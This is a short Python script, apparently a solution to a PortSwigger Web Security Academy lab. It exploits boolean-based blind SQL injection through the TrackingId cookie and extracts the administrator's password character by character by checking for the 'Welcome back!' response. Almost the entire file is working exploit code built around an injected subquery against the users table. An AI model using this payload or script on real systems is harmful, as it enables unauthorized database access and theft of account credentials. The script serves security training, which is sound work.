
import pwn
from pwn import *
import requests, signal, time, pdb, sys, string


## Ctrl C
def def_handler(sig, frame):
    print("\n\n SALIENDO...")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

main_url = "https://0a4900830461bc5d80aa4e76008400d9.web-security-academy.net/"
characters= string.ascii_lowercase + string.digits

def makeRequest():

   
    result = "" 

    p1 = log.progress("Fuerza Bruta")
    p1.status("Have a nice day :3")
    
    
    time.sleep(2)

    p2 = log.progress("Password")
    
    for position in range(1,21):
        
        ##BUCLE ANIDADO   OK --- WELLCOME BACK!
        for character in characters:
            cookies = {
                'TrackingId' : "d9753jjv11RVAL64'and (select substring(password,%d,1) from users where username='administrator')='%s" %(position, character),
                'session' : 'VtVprkQVoXR4k0YLNGwM5U75AOvsQzHG'
            }

            p1.status(cookies['TrackingId'])


            r = requests.get(main_url, cookies=cookies)

            if "Welcome back!" in r.text:
                
                result += character
                p2.status(result)
                break
                

if __name__ =='__main__':

    makeRequest()

